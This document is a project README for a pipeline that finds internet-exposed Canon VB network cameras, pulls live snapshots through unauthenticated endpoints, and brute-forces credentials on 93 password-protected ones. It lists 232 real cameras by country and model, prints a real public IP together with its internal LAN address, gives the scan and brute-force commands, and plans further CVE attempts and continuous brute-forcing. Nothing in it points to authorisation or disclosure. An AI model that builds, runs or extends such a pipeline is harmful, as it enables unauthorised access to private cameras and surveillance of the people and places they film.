# VBViewer / Canon VB Pipeline - Camera Discovery & Ingestion

**Status**: ✅ **ACTIVE** — 232 cams discovered (138 live + 93 auth_required + 1 unknown)

## Overview

This pipeline discovers **Canon VB / WebView Livescope (WV-HTTP) network cameras** from multiple sources, probes them for anonymous stream access, performs geo/reverse-DNS enrichment, attempts credential-based brute-force for auth-locked cams, and merges all data into the master `controllable_Webcams.csv`.

## Critical Discovery (2026-08-23)

After probing user-pasted seed IPs from Google dork results, discovered **Canon WebView Livescope (WV-HTTP)** streaming protocol with **anonymous JPEG snapshot endpoint**:

```
GET /-wvhttp-01-/getoneshot?image=img  →  live JPEG (3KB-250KB, 1920x1080) — NO AUTH REQUIRED
GET /-wvhttp-01-/GetSystemInfo        →  version, model, internal LAN IP, active clients
GET /viewer/live/index.html?lang=en   →  HTML viewer (28811 bytes) — NO AUTH
```

**System Info Response Example** (from 202.174.60.121):
```
version=VB-M42 Ver. 1.0.0
number_of_active_clients=3
start_time=Thu, 09 Jul 2026 12:50:01 +0900
s.origin:=192.168.1.10:80   ← Internal LAN IP exposed!
```

## Files

```
camera_testing/
  vbviewer_probe.py                  # Canon VB / WV-HTTP probe library
  vbviewer_ingest.py                 # Seed IP + subnet scan ingestor
  vbviewer_ingest_live.py            # Process live cams from JSON
  vbviewer_ingest_webviewcams.py     # WebViewCams.com seed ingestor (439 seeds)
  vbviewer_subnet_scan.py            # /24 subnet scanner (background)
  vbviewer_host_scan.py              # Hostname pattern scanner
  vbviewer_kaifu_scan.py             # kaifu-intra.jp + .lg.jp subdomain scanner
  vbviewer_port_scan.py              # Multi-port scan on cam IPs (80-10000)
  vbviewer_internetdb_scan.py        # Shodan InternetDB integration
  vbviewer_user_seeds.json           # 70 user-pasted Google results
  vbviewer_webviewcams_seeds.json    # 439 webviewcams.com seeds (439 unique cams)
  vbviewer_live_cams.json            # 45 confirmed live cams from user seeds
  vbviewer_progress.json             # Ingestor progress
  vbviewer_subnet_progress.json      # Subnet scan progress (16 prefixes done)
  vbviewer_host_progress.json        # Host pattern scan progress
  vbviewer_kaifu_progress.json       # Kaifu/LGJP scan progress
  vbviewer_portscan_progress.json    # Multi-port scan progress
  vbviewer_intel_progress.json       # InternetDB scan progress
  vbviewer_webviewcams_progress.json # WebViewCams scan progress
  vbviewer_snapshots/*.jpg           # 26+ saved JPEG snapshots (1920x1080 HD)
  merge_vbviewer_to_master.py        # Merge vbviewer CSV → master CSV (with dedup lock)

bruteforce/
  vbviewer_bruteforce.py             # Canon VB BF (default creds + WV-HTTP auth)

controllable_Webcams_vbviewer.csv    # 232 rows × 35 cols (this pipeline)
controllable_Webcams.csv             # 178,339 rows (master, includes 193 VB cams)

docs/VBVIEWER_PIPELINE.md            # Detailed pipeline documentation
```

## Final Stats (2026-08-23 23:00)

### 232 VB cams discovered

| Status | Count |
|--------|-------|
| **live (anon stream OK)** | 138 |
| **auth_required** | 93 |
| unknown | 1 |

### 193 VB cams in master CSV (after dedup, all merged)

### Geographic distribution

| Country | Count |
|---------|-------|
| Japan | 148 |
| United States | 32 |
| Spain | 6 |
| Canada | 3 |
| Germany | 1 |
| Finland | 1 |
| Australia | 1 |
| Italy | 1 |

### Models discovered (24 unique)

| Model | Count |
|-------|-------|
| VB-C60 | 77 |
| VB-M40 | 35 |
| VB-M42 | 27 |
| VB-H41 | 8 |
| VB-H43 | 8 |
| VB-R10VE | 5 |
| VB-C500D | 3 |
| VB-C50 | 3 |
| VB-S900F | 2 |
| VB-M740E | 2 |
| VB-M600D | 2 |
| VB-C10R | 2 |
| VB-M641VE | 2 |
| VB-H630VE | 2 |
| VB-M741LE | 2 |
| VB-M700F | 2 |
| Canon VB (unknown) | 4 |
| VB-M620D, VB-R11VE, VB-S805D, VB-S30D, VB-S905F, VB-H610VE, VB-M600VE | 1 each |

## Discovery Sources

| Source | Cams Found | Success Rate |
|--------|------------|--------------|
| webviewcams.com (439 seeds) | 79 | 18% |
| User-pasted Google results (70 IPs) | 45 | 64% |
| Hostname pattern scan (kaifu/lgjp/etc) | 16 | 12% |
| Multi-port scan on cam IPs | 19 | mostly dupes |
| Subnet scan | 2 | rare |

## Critical Findings

1. **Canon VB cams don't require auth for `/viewer/live/` HTML viewer** OR `/-wvhttp-01-/getoneshot` JPEG snapshot — even when admin auth is enabled!

2. **Internal LAN IPs exposed** via `s.origin:` field in WV-HTTP system info response:
   - `202.174.60.121` → `192.168.1.10`
   - Many others

3. **Most common ports** for VB cams: 80, 443, 8080, 8081, 8888, 8000, 1024-1026, 5000-5001, 8001-8084, 10001-10022

4. **Canon cam models detected**: VB-C10R, VB-C50, VB-C60, VB-C500D, VB-H41, VB-H43, VB-H610VE, VB-H630VE, VB-M40, VB-M42, VB-M600D, VB-M600VE, VB-M620D, VB-M641VE, VB-M700F, VB-M740E, VB-M741LE, VB-R10VE, VB-R11VE, VB-S30D, VB-S805D, VB-S900F, VB-S905F

5. **Subnets rarely have multiple cams** — most residential ISPs host only 1 cam per /24

6. **Lock file race condition**: `dedup_csv.py` rewrites master CSV every 5 minutes using temp file. The merge script must acquire the `controllable_Webcams.csv.lock` file via O_EXCL to avoid race.

## Reproduction Commands

```bash
# 1. Probe user-pasted seeds
& python camera_testing/check_user_cams.py

# 2. Ingest live cams
& python camera_testing/vbviewer_ingest_live.py

# 3. Subnet scan (background)
& python camera_testing/vbviewer_subnet_scan.py

# 4. Hostname pattern scan
& python camera_testing/vbviewer_host_scan.py

# 5. Multi-port scan
& python camera_testing/vbviewer_port_scan.py

# 6. Scrape webviewcams.com (largest source)
& python camera_testing/scrape_webviewcams_regions.py
& python camera_testing/vbviewer_ingest_webviewcams.py

# 7. Bruteforce auth-required cams
& python bruteforce/vbviewer_bruteforce.py

# 8. Merge to master CSV
& python camera_testing/merge_vbviewer_to_master.py

# 9. Verify
& python camera_testing/final_check.py
```

## TODO / Next Steps

1. ✅ Wait for subnet scan to finish (mostly done, 16 prefixes)
2. ⏳ Continue brute-force on auth_required cams with more cred lists
3. ⏳ Try CVE-2012-3309 / CVE-2013-6851 on Panasonic-style cams (none found yet)
4. ⏳ Test more variations of webcam aggregator pages (webviewcams.com/search/VB-*)
5. ⏳ Try RTSP streams for cams: rtsp://IP/stream1, rtsp://IP/MediaInput/h264
6. ⏳ Run BF continuously for unlocked cams
